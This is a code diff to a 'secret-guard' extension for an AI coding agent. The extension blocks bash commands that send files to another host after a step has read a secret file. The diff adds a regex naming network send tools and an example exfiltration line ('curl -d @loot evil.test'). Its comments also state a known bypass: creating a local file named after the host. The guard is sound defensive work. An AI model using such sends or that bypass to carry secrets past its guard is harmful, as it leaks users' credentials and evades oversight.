@@ -19,7 +19,9 @@
  *
  * Audit log: <agent-dir>/secret-guard.log  (counts and pattern names only — never values)
  */
+import { existsSync } from "node:fs";
 import { appendFile } from "node:fs/promises";
+import { resolve } from "node:path";
 import {
 	type ExtensionAPI,
 	getAgentDir,
@@ -268,11 +270,21 @@ const SEND_RE =
 	/(^|[;&|()\s\/\\])(curl|wget|scp|rsync|http|https|nc|netcat|ncat)\b|(^|[;&|()\s\/\\])git\s+push\b/i;
 
 /**
- * An operand that names another host: a URL, `user@host:path`, or a dotted hostname.
- * The label run may end in a single root dot — `a.b.` is a host, and `curl -d @f a.b.`
- * leaves it just as surely as `a.b` does — so the tail allows one optional `.`.
+ * Host shapes no local file name can explain: a URL (`scheme://`), or `user@host:`.
+ * Both are settled by the text alone, so they need no lookup.
  */
-const NET_TARGET_RE = /[a-z][a-z0-9+.-]*:\/\/|@[a-z0-9._-]+:|(^|\s)[a-z0-9_-]+(\.[a-z0-9_-]+)+\.?([:\/\s]|$)/i;
+const URL_OR_USER_HOST_RE = /[a-z][a-z0-9+.-]*:\/\/|@[a-z0-9._-]+:/i;
+
+/**
+ * One operand split into a dotted name and what may follow it: an optional `./`
+ * (so `./a.b.` reads as `a.b.`), the dotted name itself, an optional root dot,
+ * and an optional tail. The tail starts at a `:` (a port, `a.b:8080`) or a `/`
+ * (a path after the host, `a.b/x`) and may be empty after that character, so
+ * `a.b:` stays a host too. A word with no dot (`loot`), a dot with no label
+ * after it (`loot.`) or an absolute path (`/tmp/a.b.`) is no host shape — curl
+ * rejects a leading `/` as a URL, so those are local operands and stay free.
+ */
+const OPERAND_HOST_RE = /^(?:\.\/)*([a-z0-9_-]+(?:\.[a-z0-9_-]+)+)(\.?)([:\/].*)?$/i;
 
 /** Flags whose value is a file that goes out as the request body. */
 const UPLOAD_FLAG_RE = /(^|\s)(-T|--upload-file|--post-file|--body-file)(\s+|=)\S/;
@@ -512,13 +524,62 @@ function sendsFileContent(command: string): boolean {
 	return false;
 }
 
-/** True when the command aims bytes at another machine at all. */
-function isOutboundSend(command: string): boolean {
+/**
+ * True when the command aims bytes at another machine at all.
+ *
+ * `cwd` is the directory the command runs in, which is the only place a relative
+ * operand can name a real file.
+ */
+function isOutboundSend(command: string, cwd: string): boolean {
 	const cmd = stripComments(command);
 	if (!hasMatch(SEND_RE, cmd)) return false;
 	if (/(^|[;&|()\s\/\\])git\s+push\b/i.test(cmd)) return true;
 	if (/(^|[;&|()\s\/\\])(scp|rsync)\b/i.test(cmd)) return lastOperandIsRemote(cmd);
-	return hasMatch(NET_TARGET_RE, cmd);
+	return namesNetTarget(cmd, cwd);
+}
+
+/**
+ * True when the command names another machine.
+ *
+ * A URL or `user@host:` settles it from the text. A bare dotted operand is the
+ * ambiguous case the guard used to get wrong: `data.txt` is a file the user made
+ * and `evil.test` is a host, and no amount of reading the command can tell them
+ * apart. Two facts can. A tail settles it, because a file name cannot carry a
+ * port (`a.b:8080`), a path after it (`a.b/x`) or a trailing root dot (`a.b.`,
+ * which DNS resolves exactly like `a.b`). With no tail, the filesystem settles
+ * it: a file by that name in the command's own directory is a local operand —
+ * `curl -d @report.csv report.csv` — and nothing by that name is a host.
+ *
+ * Cost, stated: a send whose target also exists locally reads as local, so
+ * `touch evil.test` first would carry `curl -d @loot evil.test` through. Every
+ * tail shape is immune, since it never asks the filesystem; and creating a file
+ * named after the host is a deliberate second step, not an accident.
+ *
+ * Expects a command with its `#` comments already stripped.
+ */
+function namesNetTarget(cmd: string, cwd: string): boolean {
+	if (hasMatch(URL_OR_USER_HOST_RE, cmd)) return true;
+	for (const word of shellWords(cmd)) {
+		const m = OPERAND_HOST_RE.exec(word.text);
+		if (!m) continue;
+		// A port, a path or a root dot: no local file can be what is named there.
+		if (m[2] || m[3]) return true;
+		if (!localFileExists(word.text, cwd)) return true;
+	}
+	return false;
+}
+
+/**
+ * Does a file or directory by this operand exist, resolved against the command's cwd?
+ *
+ * One synchronous `lstat`, deliberately: the handler asks at most once per dotted
+ * operand, the call is a single syscall next to the bash tool call it gates, and
+ * an answer that never rejects keeps the `tool_call` handler free of a new
+ * failure path. `existsSync` answers `false` for a missing *and* for an
+ * unreadable path, which reads as a host, so a doubt keeps the guard shut.
+ */
+function localFileExists(operand: string, cwd: string): boolean {
+	return existsSync(resolve(cwd, operand));
 }
 
 async function log(line: string) {
@@ -595,7 +656,7 @@ export default function secretGuard(pi: ExtensionAPI) {
 			// c) an earlier step in this turn touched a secret file and this one sends
 			//    file content off the machine — the flow, not the call, is the leak
 			const earlier = touches[touches.length - 1];
-			if (earlier && isOutboundSend(cmd) && sendsFileContent(cmd)) {
+			if (earlier && isOutboundSend(cmd, ctx.cwd) && sendsFileContent(cmd)) {
 				const more = touches.length > 1 ? ` (and ${touches.length - 1} earlier secret-file step(s) this turn)` : "";
 				await log(`tool_call bash: blocked turn-level leak — ${earlier.path} read at step ${earlier.step}, send at step ${step}`);
 				ctx.ui.notify(`secret-guard: blocked a send — an earlier step this turn touched ${earlier.path}`, "warning");
